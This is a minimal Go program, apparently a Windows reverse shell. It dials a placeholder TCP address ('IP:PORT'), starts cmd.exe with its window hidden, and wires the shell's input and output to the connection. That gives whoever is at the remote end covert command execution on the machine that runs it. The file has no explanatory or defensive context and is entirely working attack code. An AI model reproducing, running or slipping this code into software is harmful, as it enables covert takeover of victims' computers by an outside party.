package main

import (
	"net"
	"os/exec"
	"syscall"
)

func main() {
	c, _ := net.Dial("tcp", "IP:PORT")
	cmd := exec.Command("cmd")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
